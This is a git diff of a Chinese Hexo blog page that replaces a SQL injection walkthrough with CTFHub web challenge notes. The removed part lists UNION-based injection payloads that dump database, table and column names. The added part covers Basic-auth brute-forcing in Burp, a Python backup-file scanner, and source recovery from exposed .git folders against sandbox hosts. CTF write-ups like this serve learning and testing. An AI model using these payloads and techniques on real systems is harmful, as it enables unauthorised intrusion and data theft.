@@ -4,14 +4,15 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="sqlI, ECNU NLP DeepLearning AntNLP 杨云凯 网络安全 深度学习 ">
+    <meta name="keywords" content="CtfHub随笔, ECNU NLP DeepLearning AntNLP 杨云凯 网络安全 深度学习 ">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="这是数字型注入：情况是这样：
-1. 因为整数型注入，所以基本格式为:1 and 1 = 1
-2.接下来开始联合查询数据库:-1 union select 3,database()
-为什么是-1，因为id要等于一个不存在的数字，所以：-1 u">
+    <meta name="description" content="WebWeb前置技能HTTP协议请求方式题目：
+
+HTTP Method is GET
+Use CTF**B Method, I will give you flag.
+Hint: If you got 「HTTP Method Not A">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +20,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>sqlI | 网安小白</title>
+    <title>CtfHub随笔 | 网安小白</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -318,13 +319,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/28.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        sqlI
+                        CtfHub随笔
                     </div>
                 </div>
             </div>
@@ -439,6 +440,10 @@
                             <span class="chip bg-color">入门</span>
                         </a>
                         
+                        <a href="/tags/ctfhub/" target="_blank">
+                            <span class="chip bg-color">ctfhub</span>
+                        </a>
+                        
                     </div>
                     
                 </div>
@@ -447,8 +452,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/sql注入/" class="post-category" target="_blank">
-                            sql注入
+                        <a href="/categories/CTF/" class="post-category" target="_blank">
+                            CTF
                         </a>
                         
                     </div>
@@ -459,7 +464,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-18
+                    2020-12-23
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -473,14 +478,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    902
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    5 分
                 </div>
                 
                 
@@ -496,70 +501,115 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="这是数字型注入："><a href="#这是数字型注入：" class="headerlink" title="这是数字型注入："></a>这是数字型注入：</h1><p>情况是这样：</p>
-<h2 id="1-因为整数型注入，所以基本格式为"><a href="#1-因为整数型注入，所以基本格式为" class="headerlink" title="1. 因为整数型注入，所以基本格式为:"></a>1. 因为整数型注入，所以基本格式为:</h2><p>1 and 1 = 1</p>
-<h2 id="2-接下来开始联合查询数据库"><a href="#2-接下来开始联合查询数据库" class="headerlink" title="2.接下来开始联合查询数据库:"></a>2.接下来开始联合查询数据库:</h2><p>-1 union select 3,database()</p>
-<p>为什么是-1，因为id要等于一个不存在的数字，所以：-1 union select 3，datebase（）<img src="/2020/12/18/sqli/1.png" alt>发现了数据库sqli！</p>
-<h2 id="3-接下来通过查询表单来显示sqli数据库里面的列表。"><a href="#3-接下来通过查询表单来显示sqli数据库里面的列表。" class="headerlink" title="3.接下来通过查询表单来显示sqli数据库里面的列表。"></a>3.接下来通过查询表单来显示sqli数据库里面的列表。</h2><p>语句为：-1 union select 3,group_concat(schema_name) from information_schema.schemata</p>
-<p>得到回显：<img src="/2020/12/18/sqli/2.png" alt></p>
-<p>得到四个表！</p>
-<h2 id="4-根据报出的数据库，报表名字"><a href="#4-根据报出的数据库，报表名字" class="headerlink" title="4. 根据报出的数据库，报表名字"></a>4. 根据报出的数据库，报表名字</h2><p>-1 union select 3,group_concat(table_name) from information_schema.tables where table_schema=”sqli”</p>
-<p>得到回显：<img src="/2020/12/18/sqli/3.png" alt></p>
-<p>发现flag</p>
-<h2 id="5-知道了表flag，去报字段-报出flag的字段。"><a href="#5-知道了表flag，去报字段-报出flag的字段。" class="headerlink" title="5.  知道了表flag，去报字段,报出flag的字段。"></a>5.  知道了表flag，去报字段,报出flag的字段。</h2><p>-1 union select 3,group_concat(flag) from sqli.flag</p>
-<h1 id="下面是字符型注入思路："><a href="#下面是字符型注入思路：" class="headerlink" title="下面是字符型注入思路："></a>下面是字符型注入思路：</h1><h2 id="一-因为字符型所以尝试以下语句："><a href="#一-因为字符型所以尝试以下语句：" class="headerlink" title="一.因为字符型所以尝试以下语句："></a>一.因为字符型所以尝试以下语句：</h2><p>1’ and ‘1’ =’1’ – </p>
-<p>得到回显：</p>
-<p><img src="/2020/12/18/sqli/4.png" alt></p>
-<p>发现这种格式成功</p>
-<h2 id="二-那么接下来开始查找数据库有几列用order-by语句："><a href="#二-那么接下来开始查找数据库有几列用order-by语句：" class="headerlink" title="二.那么接下来开始查找数据库有几列用order by语句："></a>二.那么接下来开始查找数据库有几列用order by语句：</h2><p>1’ order by 3 – ‘发现报错，那么改为2 ：1’ order by 2 – ‘得到回显：</p>
-<p><img src="/2020/12/18/sqli/5.png" alt></p>
-<h2 id="三-判断显示的信息是第几列的信息"><a href="#三-判断显示的信息是第几列的信息" class="headerlink" title="三.判断显示的信息是第几列的信息"></a>三.判断显示的信息是第几列的信息</h2><p>一般在我们可见页面中显示的信息不一定是查询全部列数，可能查询3列，显示1列。通过‘直接闭合前面的select语句，使其前半句查询结果空(除非存在name=’‘的情况)，即数据库中不存在该查询数据，然后通过union select 1,2 显示的数字来确定显示的列的位置。</p>
-<p>$name=’ union select 1,2 – ‘</p>
-<p>根据查询结果，得到2，以后想<strong>要查询的信息就放在第二个列处。</strong></p>
-<p><img src="/2020/12/18/sqli/6.png" alt></p>
-<h2 id="四、利用函数来收集数据库信息"><a href="#四、利用函数来收集数据库信息" class="headerlink" title="四、利用函数来收集数据库信息"></a>四、利用函数来收集数据库信息</h2><p>查询sql自带的函数来确定当前用户，当前数据库等信息。</p>
-<p>数据库函数有以下：</p>
-<p>1、用户：user()</p>
-<p>2、当前数据库：database()</p>
-<p>3、数据库版本：version()</p>
-<p>4、@@hostname （用户）</p>
-<p>5、@@datadir  (数据库在文件的位置)</p>
-<p>6、@@version （版本)</p>
-<p>7、@@version_compile_OS (操作系统版本)</p>
-<p>$name=’ union select 1,user() – ‘，查询结果为：<strong>是root账户</strong></p>
-<p><img src="/2020/12/18/sqli/7.png" alt></p>
-<p>如果为root用户，就可以访问information_schema数据库。</p>
-<p>查询数据库类型，$name=’ union select 1,version() – ‘，查询结果为：</p>
-<p><img src="/2020/12/18/sqli/8.png" alt></p>
-<p>由数据库版本可知它是<strong>MySQL的一个分支</strong>。</p>
-<p>查询当前数据库名称，$name=’ union select 1,database() – ‘，查询结果为：</p>
-<p>‘ union select 1，datebase（）– ‘</p>
-<p> ‘ union select 1,datebase() – ‘</p>
-<p><img src="/2020/12/18/sqli/9.png" alt="9"></p>
-<p>当前数据库名称为：<strong>sqli</strong></p>
-<h2 id="五、通过union查询数据库"><a href="#五、通过union查询数据库" class="headerlink" title="五、通过union查询数据库"></a>五、通过union查询数据库</h2><h3 id="1、获取所有数据库名称"><a href="#1、获取所有数据库名称" class="headerlink" title="1、获取所有数据库名称"></a>1、获取所有数据库名称</h3><p>$name=’ union select 1,group_concat(schema_name) from information_schema.schemata – ‘</p>
-<p>查询结果为：</p>
-<p><img src="/2020/12/18/sqli/10.png" alt="10"></p>
-<p>当前数据库有：</p>
-<p><strong>information_schema,mysql,performance_schema,sqli</strong></p>
-<h3 id="2、查询数据库中有多少个表"><a href="#2、查询数据库中有多少个表" class="headerlink" title="2、查询数据库中有多少个表"></a>2、查询数据库中有多少个表</h3><p>$name=’ union select table_schema,count(*) from information_schema.tables – ‘</p>
-<p>​    由结果可知information_schema中有161个表</p>
-<p><img src="/2020/12/18/sqli/11.png" alt="img"></p>
-<p>查询数据库information_schema中的所有表名，在后续中需要从里面的表中查询数据，该数据库中有161个表。</p>
-<p>$name=’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’informatioin_schema’ – ‘</p>
-<h3 id="3、查询指定数据库中的表名"><a href="#3、查询指定数据库中的表名" class="headerlink" title="3、查询指定数据库中的表名"></a>3、查询指定数据库中的表名</h3><p>$name=’ union select table_schema, group_concat(table_name) from information_schema.tables where table_schema=’sqli’ – ‘</p>
-<p>根据查询结果可知，<strong>数据库sqli中有两个表：news、flag</strong></p>
-<p><img src="/2020/12/18/sqli/12.png" alt="img"></p>
-<h3 id="4、查询指定数据库指定表中的列名"><a href="#4、查询指定数据库指定表中的列名" class="headerlink" title="4、查询指定数据库指定表中的列名"></a>4、查询指定数据库指定表中的列名</h3><p>此次，通过limit逐个获取列名， limit 0,1，修改limit中第一个数字获取其他列名，如获取第二个列名：limit 1,1。</p>
-<p>$name=’ union select table_name,(select column_name from information_schema.columns where table_schema=’sqli’ and table_name=’flag’ limit 0,1) – ‘</p>
-<p>查询结果：第一个字段列名为：flag</p>
-<p><img src="/2020/12/18/sqli/13.png" alt="img"></p>
-<p>  查询第二个字段没出查询成功，说明此表中只有一个列字段</p>
-<p><img src="/2020/12/18/sqli/14.png" alt="img"></p>
-<h3 id="5、查询指定数据库指定表的列的内容"><a href="#5、查询指定数据库指定表的列的内容" class="headerlink" title="5、查询指定数据库指定表的列的内容"></a>5、查询指定数据库指定表的列的内容</h3><p>$name=’ union select 1,group_concat(flag) from sqli.flag – ‘</p>
-<p>查询结果：</p>
-<p><img src="/2020/12/18/sqli/15.png" alt="img"></p>
+                <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web前置技能"><a href="#Web前置技能" class="headerlink" title="Web前置技能"></a>Web前置技能</h2><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><pre><code>题目：
 
+HTTP Method is GET
+Use CTF**B Method, I will give you flag.
+Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php.</code></pre><p>意思就是你是get请求，你把个体请求换成CTFHUB就行</p>
+<p>所以抓包直接一把梭</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51640_1.png" alt></p>
+<h4 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h4><p>题目：</p>
+<pre><code>No Flag here!
+Give me Flag</code></pre><p>点击发现没有跳转</p>
+<p>二话不说，抓包一把梭了</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51653_2.png" alt></p>
+<p>这里状态码变为了302说明进行了重定向</p>
+<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>直接抓包，本来admin=0，然后给admin赋值=1就行了</p>
+<h4 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h4><p>得到提示 do u konw admin ?，于是猜测账号是 admin , 那么接下来就只需要爆破密码了。注意看到 HTTP 请求头部的 Authorization 字段，后面的YWFhOmjiYg==用base64 解码后是 aaa:bbb，也就是我们之前输入的账号:密码。</p>
+<p> 使用 BurpSuite 进行基础认证爆破</p>
+<p>（1）将报文发送到 Intruder, 将 Basic后面 base64部分添加为payload position</p>
+<p><img src="https://img-blog.csdnimg.cn/20200308145945197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>（2）在 Payloads选项卡下，选择 Payload Type为SimpleList,然后在 Payload Options 中点击 load 加载密码字典</p>
+<p><img src="https://img-blog.csdnimg.cn/20200308145945221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>（3）Payload Processing -&gt; Add-&gt; Add Prefix（添加前缀）-&gt; 输入 admin:</p>
+<p>  Payload Processing -&gt; Add-&gt; Encode（添加一个编码方式）-&gt; 选择 Base64 Encode</p>
+<p><img src="https://img-blog.csdnimg.cn/20200308145945348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>（4）Payload Encode 取消勾选的 URL-encode, 不然你会看到base64之后的=会被转成 %3d ，你就算爆破到天荒地老也不会出来</p>
+<p><img src="https://img-blog.csdnimg.cn/20200308145945375.png" alt="img"></p>
+<p>（5）Start Attack ，然后按 Length 排序，并看到状态码出现200的，即爆破成功</p>
+<p><img src="https://img-blog.csdnimg.cn/20200308145945389.png" alt="img"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200308145945416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzM2NzExMDI1,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>查看 Response，得到flag</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51753_3.png" alt></p>
+<p>有点操作水平。。。。</p>
+<h4 id="响应包源码"><a href="#响应包源码" class="headerlink" title="响应包源码"></a>响应包源码</h4><p>等游戏结束f12查看源码即可</p>
+<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51433_1.png" alt></p>
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p><a href="http://challenge-62869800fbc1a5d3.sandbox.ctfhub.com:10080/flag_in_here/3/4/flag.txt" target="_blank" rel="noopener">http://challenge-62869800fbc1a5d3.sandbox.ctfhub.com:10080/flag_in_here/3/4/flag.txt</a></p>
+<h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><p><a href="http://challenge-8833e0a8156bbfbb.sandbox.ctfhub.com:10080/phpinfo.php" target="_blank" rel="noopener">http://challenge-8833e0a8156bbfbb.sandbox.ctfhub.com:10080/phpinfo.php</a></p>
+<p>ctrl+f一把梭</p>
+<img src="http://images2.5666888.xyz//搜狗截图20年12月23日1437_2.png" style="zoom: 80%;">
+
+<p>ctfhub{eff7ead587e67aab8af40775}</p>
+<h3 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h3><h4 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h4><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
+<p>可能有点用的提示：</p>
+<pre><code>#### 常见的网站源码备份文件后缀
+------
+- tar
+- tar.gz
+- zip
+- rar
+#### 常见的网站源码备份文件名
+------
+- web
+- website
+- backup
+- back
+- www
+- wwwroot
+- temp</code></pre><p><a href="http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/www.zip" target="_blank" rel="noopener">http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/www.zip</a></p>
+<pre><code>\#!usr/bin/env python
+#_*_ coding:utf-8 _*_
+import requests 
+url=&quot;http://challenge-9936840b90db7048.sandbox.ctfhub.com:10080/&quot;
+list1=[&#39;web&#39;, &#39;website&#39;, &#39;backup&#39;, &#39;back&#39;, &#39;www&#39;, &#39;wwwroot&#39;, &#39;temp&#39;] 
+list2=[&#39;tar&#39;, &#39;tar.gz&#39;, &#39;zip&#39;, &#39;rar&#39;]
+for i in list1: 
+ for j in list2:      
+   url_f=url+i+&quot;.&quot;+j 
+   r=requests.get(url_f)     
+   if(r.status_code == 200):         
+   print(url_f)</code></pre><p>对没有错，就是通过这个脚本来判断是哪个页面为200</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51522_4.png" alt></p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51452_3.png" alt></p>
+<p><a href="http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/flag_33916625.txt" target="_blank" rel="noopener">http://challenge-6ede861cbefdfbaf.sandbox.ctfhub.com:10080/flag_33916625.txt</a></p>
+<p>完事！</p>
+<h4 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h4><p>介绍：当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
+<p>针对index.php.bak文件</p>
+<p>输入下载完以后改为.txt格式打开直接一把梭</p>
+<h4 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h4><p>介绍：当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>
+<p>.index.php.swp</p>
+<p>这里注意index前面有个点</p>
+<p>然后将swp改为txt打开</p>
+<h4 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h4><p>介绍：.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p>
+<p>下载完以后用.md文件格式打开</p>
+<p>18c26ec34f6edafc85a7cd5e20853f58.txt发现这个文件</p>
+<p><a href="http://challenge-f8108aa66ac9b7ac.sandbox.ctfhub.com:10080/18c26ec34f6edafc85a7cd5e20853f58.txt一把梭" target="_blank" rel="noopener">http://challenge-f8108aa66ac9b7ac.sandbox.ctfhub.com:10080/18c26ec34f6edafc85a7cd5e20853f58.txt一把梭</a></p>
+<h3 id="Gti泄露"><a href="#Gti泄露" class="headerlink" title="Gti泄露"></a>Gti泄露</h3><h4 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h4><p>介绍：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p>
+<p>先用dirsearch.py进行扫描</p>
+<p>python3 dirsearch.py -u <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> -e*</p>
+<pre><code>-u 指定网址
+ -e 指定网站语言#例如-e php，zip，这里-e*是所有
+ -t 指定线程
+ -w 指定字典
+ -r 递归目录（跑出目录后，继续跑目录下面的目录）
+ --random-agents 使用随机UA(默认在db/uesr-agents.txt中，可以自己添加)
+ -x 排除指定状态码
+ -s 置请求之间的延时(秒)</code></pre><p>然后用githack脚本跑</p>
+<pre><code>python GitHack.py http://challenge-bf6c3305d834ed77.sandbox.ctfhub.com:10080/.git</code></pre><p>跑完以后去list目录去看看</p>
+<p>进入所下载的文件里面</p>
+<pre><code>git log#使用git log命令查看本地的所有提交</code></pre><p>得：<img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A51914_4.png" alt></p>
+<pre><code>git reset --hard ea27539d5ad2aa769ee2375400a0a5afc39faab0#彻底回退到某个版本，本地的源码也会变为上一个版本的内容，撤销的commit中所包含的更改被冲掉；
+ls
+cat 241282368416724.txt</code></pre><p>得到flag</p>
+<h4 id="stash（隐藏物）"><a href="#stash（隐藏物）" class="headerlink" title="stash（隐藏物）"></a>stash（隐藏物）</h4><p>和上一题一样</p>
+<pre><code>git log
+git stash pop
+ls
+cat 13456789.txt
+说明：
+$git stash                 ／／把本地修改并且未提交的内容，存储到本地栈中的栈顶。
+$do some work        ／／此时你可以去切换分支或者pull最新代码
+$git stash pop          ／／此时你可以把你刚才stash到本地栈中的代码pop到本地</code></pre>
             </div>
             <hr />
 
@@ -717,9 +767,9 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《sqlI》
+                    《CtfHub随笔》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/12/18/sqli/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/12/23/ctfhub-sui-bi/" property="cc:attributionName"
                rel="cc:attributionURL">
                 杨云凯
             </a> 采用
@@ -760,7 +810,7 @@
         repo: 'iceberg404.github.io',
         owner: 'iceberg404',
         admin: "godweiyang",
-        id: '2020/12/18/sqli/',
+        id: '2020/12/23/ctfhub-sui-bi/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1043,48 +1093,56 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/12/19/blogbulider/">
+                <a href="/2020/12/23/ctfhub-sui-bi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="搭建博客具体教程">
+                        <img src="/medias/featureimages/28.jpg" class="responsive-img" alt="CtfHub随笔">
                         
-                        <span class="card-title">搭建博客具体教程</span>
+                        <span class="card-title">CtfHub随笔</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            阅读须知
+                            WebWeb前置技能HTTP协议请求方式题目：
 
-注意，这篇文章篇幅较长，主要针对新手，每一步很详细，所以可能会显得比较啰嗦，所以建议基础比较好小伙伴根据目录选择自己感兴趣的部分跳着看，不要文章没看，上来先喷一下！谢谢⊙o⊙⊙o⊙。教程内容随意复制使用，引用的话请加一个参考链接
+HTTP Method is GET
+Use CTF**B Method, I will give you flag.
+Hint: If you got 「HTTP Method Not A
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/博客搭建/" class="post-category" target="_blank">
-                                    博客搭建
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/博客搭建/" target="_blank">
-                        <span class="chip bg-color">博客搭建</span>
+                    <a href="/tags/入门/" target="_blank">
+                        <span class="chip bg-color">入门</span>
+                    </a>
+                    
+                    <a href="/tags/ctfhub/" target="_blank">
+                        <span class="chip bg-color">ctfhub</span>
                     </a>
                     
                 </div>
@@ -1098,31 +1156,35 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/02/16/sort-algorithms/">
+                <a href="/2020/12/21/buuctf-bi-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="十大经典排序算法整理汇总（附代码）">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="Buuctf笔记">
                         
-                        <span class="card-title">十大经典排序算法整理汇总（附代码）</span>
+                        <span class="card-title">Buuctf笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            本文整理并总结了十大经典的排序算法（冒泡排序、选择排序、插入排序、快速排序、归并排序、希尔排序、计数排序、基数排序、桶排序、堆排序）的时间复杂度、空间复杂度等性质。
+                            WEB第一题:[HCTF 2018]WarmUp这里懒得上传图片了，所以就直接笔记了
+源代码里面有1.source.php，所以打开以后还会发先2.hint.php
+1打开后会发现是代码审计
+&lt;?php
+    highlight_f
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-16
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-21
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/编程算法/" class="post-category" target="_blank">
-                                    编程算法
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
                                 </a>
                             
                             
@@ -1132,12 +1194,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/leetcode/" target="_blank">
-                        <span class="chip bg-color">leetcode</span>
+                    <a href="/tags/buuctf/" target="_blank">
+                        <span class="chip bg-color">buuctf</span>
                     </a>
                     
-                    <a href="/tags/算法/" target="_blank">
-                        <span class="chip bg-color">算法</span>
+                    <a href="/tags/web入门/" target="_blank">
+                        <span class="chip bg-color">web入门</span>
                     </a>
                     
                 </div>
